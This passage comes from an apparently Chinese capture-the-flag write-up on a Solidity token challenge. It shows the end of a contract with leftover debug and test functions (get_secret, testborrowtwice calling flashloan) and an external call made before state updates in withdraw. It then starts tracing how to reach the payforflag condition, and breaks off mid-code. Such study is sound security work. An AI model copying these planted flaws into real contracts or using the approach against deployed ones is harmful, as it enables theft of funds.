punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="257"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="258"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="259"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="260"></td><td><pre></pre></td></tr><tr><td data-num="261"></td><td><pre>   </pre></td></tr><tr><td data-num="262"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">increaseAllowance</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> addedValue<span class="token punctuation">)</span> <span class="token keyword">public</span> virtual <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="263"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 不允许被 owner 以外调用</span></pre></td></tr><tr><td data-num="264"></td><td><pre>        <span class="token builtin">address</span> owner <span class="token operator">=</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="265"></td><td><pre>        <span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> <span class="token function">allowance</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">)</span> <span class="token operator">+</span> addedValue<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="266"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="267"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="268"></td><td><pre></pre></td></tr><tr><td data-num="269"></td><td><pre>    </pre></td></tr><tr><td data-num="270"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">decreaseAllowance</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> subtractedValue<span class="token punctuation">)</span> <span class="token keyword">public</span> virtual <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="271"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 不允许被 owner 以外调用</span></pre></td></tr><tr><td data-num="272"></td><td><pre>        <span class="token builtin">address</span> owner <span class="token operator">=</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="273"></td><td><pre>        <span class="token builtin">uint256</span> currentAllowance <span class="token operator">=</span> <span class="token function">allowance</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="274"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>currentAllowance <span class="token operator">>=</span> subtractedValue<span class="token punctuation">,</span> <span class="token string">"ERC20: decreased allowance below zero"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="275"></td><td><pre>        unchecked <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="276"></td><td><pre>            <span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> currentAllowance <span class="token operator">-</span> subtractedValue<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="277"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="278"></td><td><pre></pre></td></tr><tr><td data-num="279"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="280"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="281"></td><td><pre></pre></td></tr><tr><td data-num="282"></td><td><pre>    </pre></td></tr><tr><td data-num="283"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_transfer</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="284"></td><td><pre>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="285"></td><td><pre>        <span class="token builtin">address</span> to<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="286"></td><td><pre>        <span class="token builtin">uint256</span> amount</pre></td></tr><tr><td data-num="287"></td><td><pre>    <span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="288"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ERC20: transfer from the zero address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="289"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>to <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ERC20: transfer to the zero address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="290"></td><td><pre></pre></td></tr><tr><td data-num="291"></td><td><pre>        <span class="token function">_beforeTokenTransfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="292"></td><td><pre></pre></td></tr><tr><td data-num="293"></td><td><pre>        <span class="token builtin">uint256</span> fromBalance <span class="token operator">=</span> _balances<span class="token punctuation">[</span><span class="token keyword">from</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="294"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>fromBalance <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"ERC20: transfer amount exceeds balance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="295"></td><td><pre>        unchecked <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="296"></td><td><pre>            _balances<span class="token punctuation">[</span><span class="token keyword">from</span><span class="token punctuation">]</span> <span class="token operator">=</span> fromBalance <span class="token operator">-</span> amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="297"></td><td><pre>            <span class="token comment">// Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by</span></pre></td></tr><tr><td data-num="298"></td><td><pre>            <span class="token comment">// decrementing then incrementing.</span></pre></td></tr><tr><td data-num="299"></td><td><pre>            _balances<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="300"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="301"></td><td><pre></pre></td></tr><tr><td data-num="302"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">Transfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="303"></td><td><pre></pre></td></tr><tr><td data-num="304"></td><td><pre>        <span class="token function">_afterTokenTransfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="305"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="306"></td><td><pre></pre></td></tr><tr><td data-num="307"></td><td><pre>   </pre></td></tr><tr><td data-num="308"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> account<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="309"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>account <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ERC20: mint to the zero address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="310"></td><td><pre></pre></td></tr><tr><td data-num="311"></td><td><pre>        <span class="token function">_beforeTokenTransfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> account<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="312"></td><td><pre></pre></td></tr><tr><td data-num="313"></td><td><pre>        _totalSupply <span class="token operator">+=</span> amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="314"></td><td><pre>        unchecked <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="315"></td><td><pre>            <span class="token comment">// Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.</span></pre></td></tr><tr><td data-num="316"></td><td><pre>            _balances<span class="token punctuation">[</span>account<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="317"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="318"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">Transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> account<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="319"></td><td><pre></pre></td></tr><tr><td data-num="320"></td><td><pre>        <span class="token function">_afterTokenTransfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> account<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="321"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="322"></td><td><pre></pre></td></tr><tr><td data-num="323"></td><td><pre>   </pre></td></tr><tr><td data-num="324"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_burn</span><span class="token punctuation">(</span><span class="token builtin">address</span> account<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="325"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>account <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ERC20: burn from the zero address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="326"></td><td><pre></pre></td></tr><tr><td data-num="327"></td><td><pre>        <span class="token function">_beforeTokenTransfer</span><span class="token punctuation">(</span>account<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="328"></td><td><pre></pre></td></tr><tr><td data-num="329"></td><td><pre>        <span class="token builtin">uint256</span> accountBalance <span class="token operator">=</span> _balances<span class="token punctuation">[</span>account<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="330"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>accountBalance <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"ERC20: burn amount exceeds balance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="331"></td><td><pre>        unchecked <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="332"></td><td><pre>            _balances<span class="token punctuation">[</span>account<span class="token punctuation">]</span> <span class="token operator">=</span> accountBalance <span class="token operator">-</span> amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="333"></td><td><pre>            <span class="token comment">// Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.</span></pre></td></tr><tr><td data-num="334"></td><td><pre>            _totalSupply <span class="token operator">-=</span> amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="335"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="336"></td><td><pre></pre></td></tr><tr><td data-num="337"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">Transfer</span><span class="token punctuation">(</span>account<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="338"></td><td><pre></pre></td></tr><tr><td data-num="339"></td><td><pre>        <span class="token function">_afterTokenTransfer</span><span class="token punctuation">(</span>account<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="340"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="341"></td><td><pre></pre></td></tr><tr><td data-num="342"></td><td><pre>    </pre></td></tr><tr><td data-num="343"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_approve</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="344"></td><td><pre>        <span class="token builtin">address</span> owner<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="345"></td><td><pre>        <span class="token builtin">address</span> spender<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="346"></td><td><pre>        <span class="token builtin">uint256</span> amount</pre></td></tr><tr><td data-num="347"></td><td><pre>    <span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="348"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ERC20: approve from the zero address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="349"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>spender <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ERC20: approve to the zero address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="350"></td><td><pre></pre></td></tr><tr><td data-num="351"></td><td><pre>        _allowances<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">[</span>spender<span class="token punctuation">]</span> <span class="token operator">=</span> amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="352"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">Approval</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="353"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="354"></td><td><pre></pre></td></tr><tr><td data-num="355"></td><td><pre>    </pre></td></tr><tr><td data-num="356"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_spendAllowance</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="357"></td><td><pre>        <span class="token builtin">address</span> owner<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="358"></td><td><pre>        <span class="token builtin">address</span> spender<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="359"></td><td><pre>        <span class="token builtin">uint256</span> amount</pre></td></tr><tr><td data-num="360"></td><td><pre>    <span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="361"></td><td><pre>        <span class="token builtin">uint256</span> currentAllowance <span class="token operator">=</span> <span class="token function">allowance</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="362"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>currentAllowance <span class="token operator">!=</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="363"></td><td><pre>            <span class="token keyword">require</span><span class="token punctuation">(</span>currentAllowance <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"ERC20: insufficient allowance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="364"></td><td><pre>            unchecked <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="365"></td><td><pre>                <span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> currentAllowance <span class="token operator">-</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="366"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="367"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="368"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="369"></td><td><pre></pre></td></tr><tr><td data-num="370"></td><td><pre></pre></td></tr><tr><td data-num="371"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_beforeTokenTransfer</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="372"></td><td><pre>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="373"></td><td><pre>        <span class="token builtin">address</span> to<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="374"></td><td><pre>        <span class="token builtin">uint256</span> amount</pre></td></tr><tr><td data-num="375"></td><td><pre>    <span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="376"></td><td><pre></pre></td></tr><tr><td data-num="377"></td><td><pre>    </pre></td></tr><tr><td data-num="378"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_afterTokenTransfer</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="379"></td><td><pre>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="380"></td><td><pre>        <span class="token builtin">address</span> to<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="381"></td><td><pre>        <span class="token builtin">uint256</span> amount</pre></td></tr><tr><td data-num="382"></td><td><pre>    <span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="383"></td><td><pre></pre></td></tr><tr><td data-num="384"></td><td><pre>    <span class="token comment">// debug param secret</span></pre></td></tr><tr><td data-num="385"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">get_secret</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="386"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="387"></td><td><pre>        <span class="token keyword">return</span> secret<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="388"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="389"></td><td><pre></pre></td></tr><tr><td data-num="390"></td><td><pre>    <span class="token comment">// debug param tokenprice</span></pre></td></tr><tr><td data-num="391"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">get_price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="392"></td><td><pre>        <span class="token keyword">return</span> tokenprice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="393"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="394"></td><td><pre></pre></td></tr><tr><td data-num="395"></td><td><pre>    <span class="token comment">// test need to be delete</span></pre></td></tr><tr><td data-num="396"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">testborrowtwice</span><span class="token punctuation">(</span>SignCoupon <span class="token keyword">calldata</span> scoupon<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="397"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>loankey <span class="token operator">==</span> <span class="token number">2233</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="398"></td><td><pre>        <span class="token function">MyToken</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flashloan</span><span class="token punctuation">(</span>scoupon<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="399"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="400"></td><td><pre></pre></td></tr><tr><td data-num="401"></td><td><pre>    <span class="token comment">// test need to be delete</span></pre></td></tr><tr><td data-num="402"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">set_secret</span><span class="token punctuation">(</span><span class="token builtin">uint</span> secret_<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyowner <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="403"></td><td><pre>        secret <span class="token operator">=</span> secret_<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="404"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">changeprice</span><span class="token punctuation">(</span>secret_<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="405"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="406"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="1明确目标"><a class="anchor" href="#1明确目标">#</a> 1. 明确目标</h3>
<p>这里我们注意到了一个函数 <code>payforflag</code> , 很明显，我们需要调用这一个函数来获得我们的 flag, 那么调用这个函数的条件是什么呢？</p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">payforflag</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> mid<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> b64email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_flag<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">sendflag</span><span class="token punctuation">(</span>mid<span class="token punctuation">,</span> b64email<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>我们需要 <code>_flag[msg.sender]</code>  的值为 2</p>
<p>接下来要做的就是寻找函数使 <code>_flag[msg.sender] </code> 的值到 2.</p>
<p>通过寻找，我们找到了 <code>withdraw</code>  这个函数，而这个函数的执行需要满足两个条件，分别是 <code>ethbalances[msg.sender] &gt;= 1</code>  和 <code>_ebalances[msg.sender] &gt;= 1812</code> .</p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>ethbalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_ebalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">1812</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">payable</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span><span class="token number">100000000000000000</span> wei<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        </pre></td></tr><tr><td data-num="6"></td><td><pre>        _ebalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        _flag<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h4 id="第一个条件"><a class="anchor" href="#第一个条件">#</a> 第一个条件</h4>
<p>先看第一个条件 <code>ethbalances[msg.sender] &gt;= 1</code> , 我们可以使用 <code>deposit</code>  这个函数来令其满足</p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_depositd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"you can only deposit once"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        _depositd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        ethbalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h4 id="第二个条件"><a class="anchor" href="#第二个条件">#</a> 第二个条件</h4>
<p>再看第二个条件 <code>_ebalances[msg.sender] &gt;= 1812</code> , 涉及到该变量的函数有 <code>profit</code> , <code>borrow</code> , <code>buy</code> , <code>sale</code></p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">profit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_profited<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        _profited<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> msg<span class="token 